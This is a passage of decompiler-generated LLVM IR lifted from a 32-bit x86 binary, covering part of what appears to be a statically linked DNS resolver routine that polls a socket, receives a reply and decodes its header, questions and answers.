  %v2_8052be2 = inttoptr i32 %v1_8052be2 to i16*
  store i16 1, i16* %v2_8052be2, align 2
  %v0_8052bec = load i32, i32* @esp, align 4
  %v1_8052bef = add i32 %v0_8052bec, 8
  %v2_8052bef = inttoptr i32 %v1_8052bef to i32*
  store i32 10000, i32* %v2_8052bef, align 4
  %v1_8052bf4 = add i32 %v0_8052bec, 4
  %v2_8052bf4 = inttoptr i32 %v1_8052bf4 to i32*
  store i32 1, i32* %v2_8052bf4, align 4
  %v1_8052bf6 = add i32 %v0_8052bec, 228
  store i32 %v1_8052bf6, i32* %eax.global-to-local, align 4
  %v3_8052bfd = inttoptr i32 %v0_8052bec to i32*
  store i32 %v1_8052bf6, i32* %v3_8052bfd, align 4
  %v0_8052bfe = call i32 @__libc_poll()
  store i32 %v0_8052bfe, i32* %eax.global-to-local, align 4
  %v0_8052c03 = load i32, i32* @esp, align 4
  %v1_8052c03 = add i32 %v0_8052c03, 16
  %tmp48 = icmp slt i32 %v0_8052bfe, 1
  br i1 %tmp48, label %dec_label_pc_8052f27, label %dec_label_pc_8052c0e

dec_label_pc_8052c0e:                             ; preds = %dec_label_pc_8052bc7
  %v1_8052c0e = add i32 %v0_8052c03, 12
  %v2_8052c0e = inttoptr i32 %v1_8052c0e to i32*
  store i32 0, i32* %v2_8052c0e, align 4
  %v1_8052c10 = add i32 %v0_8052c03, 8
  %v2_8052c10 = inttoptr i32 %v1_8052c10 to i32*
  store i32 512, i32* %v2_8052c10, align 4
  %v2_8052c15 = add i32 %v0_8052c03, 4
  %v3_8052c15 = inttoptr i32 %v2_8052c15 to i32*
  store i32 %v2_80528da, i32* %v3_8052c15, align 4
  %v1_8052c16 = add i32 %v0_8052c03, 36
  %v2_8052c16 = inttoptr i32 %v1_8052c16 to i32*
  %v3_8052c16 = load i32, i32* %v2_8052c16, align 4
  %v6_8052c16 = inttoptr i32 %v0_8052c03 to i32*
  store i32 %v3_8052c16, i32* %v6_8052c16, align 4
  %v5_8052c1a = call i32 @__libc_recv(i32 -1, i32 %v15_8052968, i32 %v3_80529c7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052c1a, i32* @eax, align 4
  %v1_8052c1f = load i32, i32* @esp, align 4
  %v2_8052c1f = add i32 %v1_8052c1f, 32
  %v3_8052c1f = inttoptr i32 %v2_8052c1f to i32*
  store i32 %v5_8052c1a, i32* %v3_8052c1f, align 4
  %v0_8052c23 = load i32, i32* @esp, align 4
  %v1_8052c23 = add i32 %v0_8052c23, 16
  %v7_8052c29 = icmp sgt i32 %v5_8052c1a, 11
  br i1 %v7_8052c29, label %dec_label_pc_8052c2f, label %dec_label_pc_8052edc

dec_label_pc_8052c2f:                             ; preds = %dec_label_pc_8052c0e
  %v0_8052c2f = load i32, i32* @ebx, align 4
  %v2_8052c2f = add i32 %v0_8052c23, 12
  %v3_8052c2f = inttoptr i32 %v2_8052c2f to i32*
  store i32 %v0_8052c2f, i32* %v3_8052c2f, align 4
  %v0_8052c30 = load i32, i32* @ebx, align 4
  %v2_8052c30 = add i32 %v0_8052c23, 8
  %v3_8052c30 = inttoptr i32 %v2_8052c30 to i32*
  store i32 %v0_8052c30, i32* %v3_8052c30, align 4
  %v1_8052c31 = add i32 %v0_8052c23, 84
  store i32 %v1_8052c31, i32* %eax.global-to-local, align 4
  %v2_8052c35 = add i32 %v0_8052c23, 4
  %v3_8052c35 = inttoptr i32 %v2_8052c35 to i32*
  store i32 %v1_8052c31, i32* %v3_8052c35, align 4
  %v3_8052c36 = inttoptr i32 %v0_8052c23 to i32*
  store i32 %v2_80528da, i32* %v3_8052c36, align 4
  %v0_8052c37 = call i32 @__decode_header()
  store i32 %v0_8052c37, i32* %eax.global-to-local, align 4
  %v0_8052c3c = load i32, i32* @esp, align 4
  %v1_8052c3c = add i32 %v0_8052c3c, 84
  %v2_8052c3c = inttoptr i32 %v1_8052c3c to i32*
  %v3_8052c3c = load i32, i32* %v2_8052c3c, align 4
  store i32 %v3_8052c3c, i32* %edx.global-to-local, align 4
  %v2_8052c40 = add i32 %v0_8052c3c, 72
  %v3_8052c40 = inttoptr i32 %v2_8052c40 to i32*
  store i32 %v3_8052c3c, i32* %v3_8052c40, align 4
  %v0_8052c44 = load i32, i32* @esp, align 4
  %v1_8052c44 = add i32 %v0_8052c44, 16
  %v1_8052c47 = add i32 %v0_8052c44, 60
  %v2_8052c47 = inttoptr i32 %v1_8052c47 to i32*
  %v3_8052c47 = load i32, i32* %v2_8052c47, align 4
  store i32 %v3_8052c47, i32* @eax, align 4
  %v0_8052c4b = load i32, i32* %edx.global-to-local, align 4
  %v12_8052c4b = icmp eq i32 %v0_8052c4b, %v3_8052c47
  %v1_8052c4d = icmp eq i1 %v12_8052c4b, false
  br i1 %v1_8052c4d, label %dec_label_pc_8052edc, label %dec_label_pc_8052c53

dec_label_pc_8052c53:                             ; preds = %dec_label_pc_8052c2f
  %v1_8052c53 = add i32 %v0_8052c44, 88
  %v2_8052c53 = inttoptr i32 %v1_8052c53 to i32*
  %v3_8052c53 = load i32, i32* %v2_8052c53, align 4
  %v4_8052c53 = icmp eq i32 %v3_8052c53, 0
  br i1 %v4_8052c53, label %dec_label_pc_8052edc, label %dec_label_pc_8052c5e

dec_label_pc_8052c5e:                             ; preds = %dec_label_pc_8052c53
  %v1_8052c5e = add i32 %v0_8052c44, 112
  %v2_8052c5e = inttoptr i32 %v1_8052c5e to i32*
  %v3_8052c5e = load i32, i32* %v2_8052c5e, align 4
  store i32 %v3_8052c5e, i32* @eax, align 4
  %v9_8052c62 = icmp eq i32 %v3_8052c5e, 3
  %v1_8052c65 = icmp eq i1 %v9_8052c62, false
  br i1 %v1_8052c65, label %dec_label_pc_8052ccd, label %dec_label_pc_8052c67

dec_label_pc_8052c67:                             ; preds = %dec_label_pc_8052c5e
  %v1_8052c67 = add i32 %v0_8052c44, 67
  %v2_8052c67 = inttoptr i32 %v1_8052c67 to i8*
  %v3_8052c67 = load i8, i8* %v2_8052c67, align 1
  %v4_8052c67 = icmp eq i8 %v3_8052c67, 0
  %v1_8052c6c = icmp eq i1 %v4_8052c67, false
  br i1 %v1_8052c6c, label %dec_label_pc_8052cbd, label %dec_label_pc_8052c6e

dec_label_pc_8052c6e:                             ; preds = %dec_label_pc_8052c67
  %v0_8052c6e = load i32, i32* @ecx, align 4
  %v2_8052c6e = add i32 %v0_8052c44, 12
  %v3_8052c6e = inttoptr i32 %v2_8052c6e to i32*
  store i32 %v0_8052c6e, i32* %v3_8052c6e, align 4
  %v1_8052c6f = add i32 %v0_8052c44, 8
  %v2_8052c6f = inttoptr i32 %v1_8052c6f to i32*
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %v2_8052c6f, align 4
  %v1_8052c74 = add i32 %v0_8052c44, 4
  %v2_8052c74 = inttoptr i32 %v1_8052c74 to i32*
  store i32 134550911, i32* %v2_8052c74, align 4
  %v1_8052c79 = add i32 %v0_8052c44, 200
  store i32 %v1_8052c79, i32* @esi, align 4
  %v3_8052c80 = inttoptr i32 %v0_8052c44 to i32*
  store i32 %v1_8052c79, i32* %v3_8052c80, align 4
  %v2_8052c81 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052c81, i32* %eax.global-to-local, align 4
  %v0_8052c86 = load i32, i32* @esp, align 4
  %v1_8052c86 = inttoptr i32 %v0_8052c86 to i32*
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %v1_8052c86, align 4
  %v1_8052c8d = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052c8d, i32* %eax.global-to-local, align 4
  %v0_8052c92 = load i32, i32* @esp, align 4
  %v1_8052c92 = inttoptr i32 %v0_8052c92 to i32*
  %v2_8052c92 = load i32, i32* %v1_8052c92, align 4
  store i32 %v2_8052c92, i32* @eax, align 4
  %v3_8052c92 = add i32 %v0_8052c92, 4
  %v1_8052c93 = inttoptr i32 %v3_8052c92 to i32*
  %v2_8052c93 = load i32, i32* %v1_8052c93, align 4
  store i32 %v2_8052c93, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052c93, align 4
  %v0_8052c96 = load i32, i32* @esi, align 4
  store i32 %v0_8052c96, i32* %v1_8052c92, align 4
  %v0_8052c97 = load i32, i32* @global_var_8060818.281, align 8
  store i32 %v0_8052c97, i32* %ebx.global-to-local, align 4
  %v2_8052c9d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052c9d, i32* %eax.global-to-local, align 4
  %v0_8052ca2 = load i32, i32* @esp, align 4
  %v1_8052ca5 = add i32 %v0_8052c97, -1
  store i32 %v1_8052ca5, i32* @ebx, align 4
  %v1_8052ca6 = add i32 %v0_8052ca2, 52
  %v2_8052ca6 = inttoptr i32 %v1_8052ca6 to i32*
  %v3_8052ca6 = load i32, i32* %v2_8052ca6, align 4
  %v5_8052ca6 = sub i32 %v3_8052ca6, %v1_8052ca5
  %v11_8052ca6 = xor i32 %v3_8052ca6, %v1_8052ca5
  %v12_8052ca6 = xor i32 %v5_8052ca6, %v3_8052ca6
  %v13_8052ca6 = and i32 %v12_8052ca6, %v11_8052ca6
  %v14_8052ca6 = icmp slt i32 %v13_8052ca6, 0
  %v16_8052ca6 = icmp slt i32 %v5_8052ca6, 0
  %v2_8052caa = icmp eq i1 %v16_8052ca6, %v14_8052ca6
  br i1 %v2_8052caa, label %dec_label_pc_8052cbd, label %dec_label_pc_8052cac

dec_label_pc_8052cac:                             ; preds = %dec_label_pc_8052c6e
  %v4_8052cac = add i32 %v3_8052ca6, 1
  store i32 %v4_8052cac, i32* %v2_8052ca6, align 4
  %v0_8052cb0 = load i32, i32* @esp, align 4
  %v1_8052cb0 = add i32 %v0_8052cb0, 56
  %v2_8052cb0 = inttoptr i32 %v1_8052cb0 to i32*
  %v3_8052cb0 = load i32, i32* %v2_8052cb0, align 4
  store i32 %v3_8052cb0, i32* %edx.global-to-local, align 4
  %v2_8052cb4 = add i32 %v0_8052cb0, 44
  %v3_8052cb4 = inttoptr i32 %v2_8052cb4 to i32*
  store i32 %v3_8052cb0, i32* %v3_8052cb4, align 4
  br label %dec_label_pc_8052f48.backedge

dec_label_pc_8052cbd:                             ; preds = %dec_label_pc_8052c6e, %dec_label_pc_8052c67
  %v0_8052cbd = call i32 @__GI___h_errno_location()
  store i32 %v0_8052cbd, i32* %eax.global-to-local, align 4
  %v1_8052cc2 = inttoptr i32 %v0_8052cbd to i32*
  store i32 1, i32* %v1_8052cc2, align 4
  br label %dec_label_pc_8052f80

dec_label_pc_8052ccd:                             ; preds = %dec_label_pc_8052c5e
  %v1_8052ccd = icmp eq i32 %v3_8052c5e, 0
  %v1_8052ccf = icmp eq i1 %v1_8052ccd, false
  br i1 %v1_8052ccf, label %dec_label_pc_8052edc, label %dec_label_pc_8052cd5

dec_label_pc_8052cd5:                             ; preds = %dec_label_pc_8052ccd
  %v1_8052cd5 = add i32 %v0_8052c44, 120
  %v2_8052cd5 = inttoptr i32 %v1_8052cd5 to i32*
  %v3_8052cd5 = load i32, i32* %v2_8052cd5, align 4
  %tmp49 = icmp slt i32 %v3_8052cd5, 1
  br i1 %tmp49, label %dec_label_pc_8052ce5, label %dec_label_pc_8052cdc

dec_label_pc_8052cdc:                             ; preds = %dec_label_pc_8052cd5
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8052d0455 = add i32 %v0_8052c44, 116
  %v3_8052d0456 = inttoptr i32 %v2_8052d0455 to i32*
  %v4_8052d0457 = load i32, i32* %v3_8052d0456, align 4
  %v5_8052d0458 = sub i32 0, %v4_8052d0457
  %v13_8052d0462 = and i32 %v4_8052d0457, %v5_8052d0458
  %v14_8052d0463 = icmp slt i32 %v13_8052d0462, 0
  %v16_8052d0465 = icmp slt i32 %v5_8052d0458, 0
  %v2_8052d0866 = icmp eq i1 %v16_8052d0465, %v14_8052d0463
  br i1 %v2_8052d0866, label %dec_label_pc_8052d0a, label %dec_label_pc_8052cf5

dec_label_pc_8052ce5:                             ; preds = %dec_label_pc_8052cd5
  %v0_8052ce5 = call i32 @__GI___h_errno_location()
  store i32 %v0_8052ce5, i32* %eax.global-to-local, align 4
  %v1_8052cea = inttoptr i32 %v0_8052ce5 to i32*
  store i32 4, i32* %v1_8052cea, align 4
  br label %dec_label_pc_8052f80

dec_label_pc_8052cf5:                             ; preds = %dec_label_pc_8052cdc, %dec_label_pc_8052cf5
  %v0_8052d0c68 = phi i32 [ %v1_8052d01, %dec_label_pc_8052cf5 ], [ %v1_8052c44, %dec_label_pc_8052cdc ]
  %v0_8052cf567 = phi i32 [ %v0_8052cf9, %dec_label_pc_8052cf5 ], [ %v3_8052c5e, %dec_label_pc_8052cdc ]
  %v2_8052cf5 = add i32 %v0_8052d0c68, -4
  %v3_8052cf5 = inttoptr i32 %v2_8052cf5 to i32*
  store i32 %v0_8052cf567, i32* %v3_8052cf5, align 4
  %v0_8052cf6 = load i32, i32* @eax, align 4
  %v2_8052cf6 = add i32 %v0_8052d0c68, -8
  %v3_8052cf6 = inttoptr i32 %v2_8052cf6 to i32*
  store i32 %v0_8052cf6, i32* %v3_8052cf6, align 4
  %v0_8052cf7 = load i32, i32* @esi, align 4
  %v2_8052cf7 = add i32 %v0_8052d0c68, -12
  %v3_8052cf7 = inttoptr i32 %v2_8052cf7 to i32*
  store i32 %v0_8052cf7, i32* %v3_8052cf7, align 4
  %v2_8052cf8 = add i32 %v0_8052d0c68, -16
  %v3_8052cf8 = inttoptr i32 %v2_8052cf8 to i32*
  store i32 %v2_80528da, i32* %v3_8052cf8, align 4
  %v0_8052cf9 = call i32 @__length_question()
  store i32 %v0_8052cf9, i32* @eax, align 4
  %v0_8052cfe = load i32, i32* @ebx, align 4
  %v1_8052cfe = add i32 %v0_8052cfe, 1
  store i32 %v1_8052cfe, i32* @ebx, align 4
  %v0_8052cff = load i32, i32* @esi, align 4
  %v2_8052cff = add i32 %v0_8052cff, %v0_8052cf9
  store i32 %v2_8052cff, i32* @esi, align 4
  %v0_8052d01 = load i32, i32* @esp, align 4
  %v1_8052d01 = add i32 %v0_8052d01, 16
  %v2_8052d04 = add i32 %v0_8052d01, 116
  %v3_8052d04 = inttoptr i32 %v2_8052d04 to i32*
  %v4_8052d04 = load i32, i32* %v3_8052d04, align 4
  %v5_8052d04 = sub i32 %v1_8052cfe, %v4_8052d04
  %v11_8052d04 = xor i32 %v4_8052d04, %v1_8052cfe
  %v12_8052d04 = xor i32 %v5_8052d04, %v1_8052cfe
  %v13_8052d04 = and i32 %v12_8052d04, %v11_8052d04
  %v14_8052d04 = icmp slt i32 %v13_8052d04, 0
  %v16_8052d04 = icmp slt i32 %v5_8052d04, 0
  %v2_8052d08 = icmp eq i1 %v16_8052d04, %v14_8052d04
  br i1 %v2_8052d08, label %dec_label_pc_8052d0a, label %dec_label_pc_8052cf5

dec_label_pc_8052d0a:                             ; preds = %dec_label_pc_8052cf5, %dec_label_pc_8052cdc
  %v0_8052d0c.lcssa = phi i32 [ %v1_8052c44, %dec_label_pc_8052cdc ], [ %v1_8052d01, %dec_label_pc_8052cf5 ]
  store i32 0, i32* @ebx, align 4
  %v1_8052d0c = add i32 %v0_8052d0c.lcssa, 27
  %v2_8052d0c = inttoptr i32 %v1_8052d0c to i8*
  store i8 1, i8* %v2_8052d0c, align 1
  %v0_8052e3a.pre = load i32, i32* @ebx, align 4
  %v1_8052e3a.pre = load i32, i32* @esp, align 4
  %v2_8052e3a69 = add i32 %v1_8052e3a.pre, 104
  %v3_8052e3a70 = inttoptr i32 %v2_8052e3a69 to i32*
  %v4_8052e3a71 = load i32, i32* %v3_8052e3a70, align 4
  %v5_8052e3a72 = sub i32 %v0_8052e3a.pre, %v4_8052e3a71
  %v11_8052e3a74 = xor i32 %v4_8052e3a71, %v0_8052e3a.pre
  %v12_8052e3a75 = xor i32 %v5_8052e3a72, %v0_8052e3a.pre
  %v13_8052e3a76 = and i32 %v12_8052e3a75, %v11_8052e3a74
  %v14_8052e3a77 = icmp slt i32 %v13_8052e3a76, 0
  %v16_8052e3a79 = icmp slt i32 %v5_8052e3a72, 0
  %v2_8052e3e80 = icmp eq i1 %v16_8052e3a79, %v14_8052e3a77
  br i1 %v2_8052e3e80, label %dec_label_pc_8052e4a, label %dec_label_pc_8052e40.lr.ph

dec_label_pc_8052e40.lr.ph:                       ; preds = %dec_label_pc_8052d0a
  %v0_8052e40.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052e40

dec_label_pc_8052d16:                             ; preds = %dec_label_pc_8052e40
  %v1_8052d16 = add i32 %v0_8052d1681, 116
  store i32 %v1_8052d16, i32* %eax.global-to-local, align 4
  %v2_8052d1a = add i32 %v0_8052d1681, -4
  %v3_8052d1a = inttoptr i32 %v2_8052d1a to i32*
  store i32 %v1_8052d16, i32* %v3_8052d1a, align 4
  %v3_8052d1b = load i32, i32* %v3_8052e40, align 4
  %v5_8052d1b = add i32 %v0_8052d1681, -8
  %v6_8052d1b = inttoptr i32 %v5_8052d1b to i32*
  store i32 %v3_8052d1b, i32* %v6_8052d1b, align 4
  %v0_8052d1f = load i32, i32* @esi, align 4
  %v2_8052d1f = add i32 %v0_8052d1681, -12
  %v3_8052d1f = inttoptr i32 %v2_8052d1f to i32*
  store i32 %v0_8052d1f, i32* %v3_8052d1f, align 4
  %v2_8052d20 = add i32 %v0_8052d1681, -16
  %v3_8052d20 = inttoptr i32 %v2_8052d20 to i32*
  store i32 %v2_80528da, i32* %v3_8052d20, align 4
  %v0_8052d21 = call i32 @__decode_answer()
  store i32 %v0_8052d21, i32* @eax, align 4
  %v1_8052d26 = load i32, i32* @esp, align 4
  %v2_8052d26 = add i32 %v1_8052d26, 68
  %v3_8052d26 = inttoptr i32 %v2_8052d26 to i32*
  store i32 %v0_8052d21, i32* %v3_8052d26, align 4
  %v0_8052d2a = load i32, i32* @esp, align 4
  %v1_8052d2a = add i32 %v0_8052d2a, 16
  %v2_8052d2d = icmp slt i32 %v0_8052d21, 0
  %v1_8052d2f = icmp eq i1 %v2_8052d2d, false
  br i1 %v1_8052d2f, label %dec_label_pc_8052d49, label %dec_label_pc_8052d31

dec_label_pc_8052d31:                             ; preds = %dec_label_pc_8052d16
  %v0_8052d31 = load i32, i32* @ebx, align 4
  %v1_8052d31 = icmp eq i32 %v0_8052d31, 0
  br i1 %v1_8052d31, label %dec_label_pc_8052edc, label %dec_label_pc_8052d39

dec_label_pc_8052d39:                             ; preds = %dec_label_pc_8052d31
  %v1_8052d39 = add i32 %v0_8052d2a, 100
  %v2_8052d39 = inttoptr i32 %v1_8052d39 to i32*
  %v3_8052d39 = load i32, i32* %v2_8052d39, align 4
  %v4_8052d39 = icmp eq i32 %v3_8052d39, 0
  br i1 %v4_8052d39, label %dec_label_pc_8052edc, label %dec_label_pc_8052e4a

dec_label_pc_8052d49:                             ; preds = %dec_label_pc_8052d16
  %v1_8052d49 = add i32 %v0_8052d2a, 43
  %v2_8052d49 = inttoptr i32 %v1_8052d49 to i8*
  %v3_8052d49 = load i8, i8* %v2_8052d49, align 1
  %v4_8052d49 = icmp eq i8 %v3_8052d49, 0
  br i1 %v4_8052d49, label %dec_label_pc_8052dea, label %dec_label_pc_8052d54

dec_label_pc_8052d54:                             ; preds = %dec_label_pc_8052d49
  %v0_8052d54 = load i32, i32* @edi, align 4
  %v1_8052d54 = add i32 %v0_8052d54, 28
  %v2_8052d54 = inttoptr i32 %v1_8052d54 to i32*
  %v3_8052d54 = load i32, i32* %v2_8052d54, align 4
  store i32 %v3_8052d54, i32* %eax.global-to-local, align 4
  %v2_8052d57 = add i32 %v0_8052d2a, 160
  %v3_8052d57 = inttoptr i32 %v2_8052d57 to i32*
  store i32 %v3_8052d54, i32* %v3_8052d57, align 4
  %v0_8052d5e = load i32, i32* @edi, align 4
  %v1_8052d5e = add i32 %v0_8052d5e, 32
  %v2_8052d5e = inttoptr i32 %v1_8052d5e to i32*
  %v3_8052d5e = load i32, i32* %v2_8052d5e, align 4
  store i32 %v3_8052d5e, i32* %eax.global-to-local, align 4
  %v1_8052d61 = load i32, i32* @esp, align 4
  %v2_8052d61 = add i32 %v1_8052d61, 148
  %v3_8052d61 = inttoptr i32 %v2_8052d61 to i32*
  store i32 %v3_8052d5e, i32* %v3_8052d61, align 4
  %v0_8052d68 = load i32, i32* @edi, align 4
  %v1_8052d68 = add i32 %v0_8052d68, 36
  %v2_8052d68 = inttoptr i32 %v1_8052d68 to i32*
  %v3_8052d68 = load i32, i32* %v2_8052d68, align 4
  store i32 %v3_8052d68, i32* %eax.global-to-local, align 4
  %v1_8052d6b = load i32, i32* @esp, align 4
  %v2_8052d6b = add i32 %v1_8052d6b, 152
  %v3_8052d6b = inttoptr i32 %v2_8052d6b to i32*
  store i32 %v3_8052d68, i32* %v3_8052d6b, align 4
  %v0_8052d72 = load i32, i32* @ecx, align 4
  %v1_8052d72 = load i32, i32* @esp, align 4
  %v2_8052d72 = add i32 %v1_8052d72, -4
  %v3_8052d72 = inttoptr i32 %v2_8052d72 to i32*
  store i32 %v0_8052d72, i32* %v3_8052d72, align 4
  %v1_8052d73 = add i32 %v1_8052d72, -8
  %v2_8052d73 = inttoptr i32 %v1_8052d73 to i32*
  store i32 40, i32* %v2_8052d73, align 4
  %v1_8052d75 = add i32 %v1_8052d72, 116
  store i32 %v1_8052d75, i32* %edx.global-to-local, align 4
  %v2_8052d79 = add i32 %v1_8052d72, -12
  %v3_8052d79 = inttoptr i32 %v2_8052d79 to i32*
  store i32 %v1_8052d75, i32* %v3_8052d79, align 4
  %v0_8052d7a = load i32, i32* @edi, align 4
  %v2_8052d7a = add i32 %v1_8052d72, -16
  %v3_8052d7a = inttoptr i32 %v2_8052d7a to i32*
  store i32 %v0_8052d7a, i32* %v3_8052d7a, align 4
  %v5_8052d7b = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052968, i32 %v3_80529c7)
  store i32 %v5_8052d7b, i32* %eax.global-to-local, align 4
  %v0_8052d80 = load i32, i32* @edi, align 4
  %v1_8052d80 = add i32 %v0_8052d80, 4
  %v2_8052d80 = inttoptr i32 %v1_8052d80 to i32*
  %v3_8052d80 = load i32, i32* %v2_8052d80, align 4
  store i32 %v3_8052d80, i32* %eax.global-to-local, align 4
  %v0_8052d83 = load i32, i32* @esp, align 4
  %v1_8052d83 = add i32 %v0_8052d83, 16
  %v9_8052d86 = icmp eq i32 %v3_8052d80, 24
  br i1 %v9_8052d86, label %dec_label_pc_8052d54.dec_label_pc_8052dad_crit_edge, label %dec_label_pc_8052d8b

dec_label_pc_8052d54.dec_label_pc_8052dad_crit_edge: ; preds = %dec_label_pc_8052d54
  %.pre24 = add i32 %v0_8052d83, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8052dad.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8052dad

dec_label_pc_8052d8b:                             ; preds = %dec_label_pc_8052d54
  %v1_8052d8b = add i32 %v0_8052d80, 28
  %v2_8052d8b = inttoptr i32 %v1_8052d8b to i32*
  %v3_8052d8b = load i32, i32* %v2_8052d8b, align 4
  %v4_8052d8b = icmp eq i32 %v3_8052d8b, 0
  br i1 %v4_8052d8b, label %dec_label_pc_8052e4a, label %dec_label_pc_8052d95

dec_label_pc_8052d95:                             ; preds = %dec_label_pc_8052d8b
  %v1_8052d95 = add i32 %v0_8052d83, 260
  %v2_8052d95 = inttoptr i32 %v1_8052d95 to i32*
  %v3_8052d95 = load i32, i32* %v2_8052d95, align 4
  %v12_8052d95 = icmp eq i32 %v3_8052d95, 1
  br i1 %v12_8052d95, label %dec_label_pc_8052dad, label %dec_label_pc_8052d9f

dec_label_pc_8052d9f:                             ; preds = %dec_label_pc_8052d95
  %v12_8052d9f = icmp eq i32 %v3_8052d95, 28
  %v1_8052da7 = icmp eq i1 %v12_8052d9f, false
  br i1 %v1_8052da7, label %dec_label_pc_8052e4a, label %dec_label_pc_8052dad

dec_label_pc_8052dad:                             ; preds = %dec_label_pc_8052d54.dec_label_pc_8052dad_crit_edge, %dec_label_pc_8052d9f, %dec_label_pc_8052d95
  %v4_8052dad = phi i32 [ %v4_8052dad.pre, %dec_label_pc_8052d54.dec_label_pc_8052dad_crit_edge ], [ %v3_8052d95, %dec_label_pc_8052d9f ], [ 1, %dec_label_pc_8052d95 ]
  %v15_8052dad = icmp eq i32 %v3_8052d80, %v4_8052dad
  br i1 %v15_8052dad, label %dec_label_pc_8052dc2, label %dec_label_pc_8052db6

dec_label_pc_8052db6:                             ; preds = %dec_label_pc_8052dad
  %v1_8052db9 = inttoptr i32 %v0_8052d80 to i32*
  %v2_8052db9 = load i32, i32* %v1_8052db9, align 4
  %v5_8052db9 = inttoptr i32 %v0_8052d83 to i32*
  store i32 %v2_8052db9, i32* %v5_8052db9, align 4
  %v1_8052dbb = call i32 @free(i32 -1)
  store i32 %v1_8052dbb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e32

dec_label_pc_8052dc2:                             ; preds = %dec_label_pc_8052dad
  %v0_8052dc2 = load i32, i32* @ebx, align 4
  %v1_8052dc4 = sub i32 -1, %v0_8052dc2
  store i32 %v1_8052dc4, i32* %eax.global-to-local, align 4
  %v2_8052dc6 = add i32 %v0_8052d83, 120
  %v3_8052dc6 = inttoptr i32 %v2_8052dc6 to i32*
  %v4_8052dc6 = load i32, i32* %v3_8052dc6, align 4
  %v5_8052dc6 = add i32 %v4_8052dc6, %v1_8052dc4
  store i32 %v5_8052dc6, i32* %eax.global-to-local, align 4
  %v2_8052dca = add i32 %v0_8052d80, 36
  %v3_8052dca = inttoptr i32 %v2_8052dca to i32*
  store i32 %v5_8052dc6, i32* %v3_8052dca, align 4
  %v0_8052dcd = load i32, i32* @edi, align 4
  %v1_8052dcd = add i32 %v0_8052dcd, 16
  %v2_8052dcd = inttoptr i32 %v1_8052dcd to i32*
  %v3_8052dcd = load i32, i32* %v2_8052dcd, align 4
  %v1_8052dd0 = add i32 %v3_8052dcd, 4
  store i32 %v1_8052dd0, i32* %eax.global-to-local, align 4
  %v2_8052dd3 = add i32 %v0_8052dcd, 36
  %v3_8052dd3 = inttoptr i32 %v2_8052dd3 to i32*
  %v4_8052dd3 = load i32, i32* %v3_8052dd3, align 4
  %v7_8052dd3 = mul i32 %v4_8052dd3, %v1_8052dd0
  store i32 %v7_8052dd3, i32* %eax.global-to-local, align 4
  %v2_8052dd7 = add i32 %v0_8052dcd, 32
  %v3_8052dd7 = inttoptr i32 %v2_8052dd7 to i32*
  %v4_8052dd7 = load i32, i32* %v3_8052dd7, align 4
  %v6_8052dda = icmp ugt i32 %v7_8052dd3, %v4_8052dd7
  br i1 %v6_8052dda, label %dec_label_pc_8052dc2.dec_label_pc_8052e4a.loopexit_crit_edge, label %dec_label_pc_8052ddc

dec_label_pc_8052dc2.dec_label_pc_8052e4a.loopexit_crit_edge: ; preds = %dec_label_pc_8052dc2
  %v0_8052e4a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e4a

dec_label_pc_8052ddc:                             ; preds = %dec_label_pc_8052dc2
  store i32 0, i32* %v3_8052dd3, align 4
  %v0_8052de3 = load i32, i32* @esp, align 4
  %v1_8052de3 = add i32 %v0_8052de3, 27
  %v2_8052de3 = inttoptr i32 %v1_8052de3 to i8*
  store i8 0, i8* %v2_8052de3, align 1
  %v1_8052e35.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e35

dec_label_pc_8052dea:                             ; preds = %dec_label_pc_8052d49
  %v1_8052ded = add i32 %v0_8052d2a, 132
  %v2_8052ded = inttoptr i32 %v1_8052ded to i32*
  %v3_8052ded = load i32, i32* %v2_8052ded, align 4
  %v6_8052ded = inttoptr i32 %v0_8052d2a to i32*
  store i32 %v3_8052ded, i32* %v6_8052ded, align 4
  %v1_8052df4 = call i32 @free(i32 -1)
  store i32 %v1_8052df4, i32* %eax.global-to-local, align 4
  %v0_8052df9 = load i32, i32* @esp, align 4
  %v1_8052df9 = add i32 %v0_8052df9, 16
  %v1_8052dfc = add i32 %v0_8052df9, 260
  %v2_8052dfc = inttoptr i32 %v1_8052dfc to i32*
  %v3_8052dfc = load i32, i32* %v2_8052dfc, align 4
  store i32 %v3_8052dfc, i32* %eax.global-to-local, align 4
  %v1_8052e03 = add i32 %v0_8052df9, 136
  %v2_8052e03 = inttoptr i32 %v1_8052e03 to i32*
  %v3_8052e03 = load i32, i32* %v2_8052e03, align 4
  %v15_8052e03 = icmp eq i32 %v3_8052e03, %v3_8052dfc
  %v1_8052e07 = icmp eq i1 %v15_8052e03, false
  br i1 %v1_8052e07, label %dec_label_pc_8052e35, label %dec_label_pc_8052e09

dec_label_pc_8052e09:                             ; preds = %dec_label_pc_8052dea
  %v0_8052e09 = load i32, i32* @edi, align 4
  %v1_8052e09 = add i32 %v0_8052e09, 16
  %v2_8052e09 = inttoptr i32 %v1_8052e09 to i32*
  %v3_8052e09 = load i32, i32* %v2_8052e09, align 4
  store i32 %v3_8052e09, i32* %eax.global-to-local, align 4
  %v2_8052e0c = add i32 %v0_8052df9, 148
  %v3_8052e0c = inttoptr i32 %v2_8052e0c to i32*
  %v4_8052e0c = load i32, i32* %v3_8052e0c, align 4
  %v15_8052e0c = icmp eq i32 %v3_8052e09, %v4_8052e0c
  %v1_8052e13 = icmp eq i1 %v15_8052e0c, false
  br i1 %v1_8052e13, label %dec_label_pc_8052ecf, label %dec_label_pc_8052e19

dec_label_pc_8052e19:                             ; preds = %dec_label_pc_8052e09
  %v0_8052e19 = load i32, i32* @edx, align 4
  %v2_8052e19 = add i32 %v0_8052df9, 12
  %v3_8052e19 = inttoptr i32 %v2_8052e19 to i32*
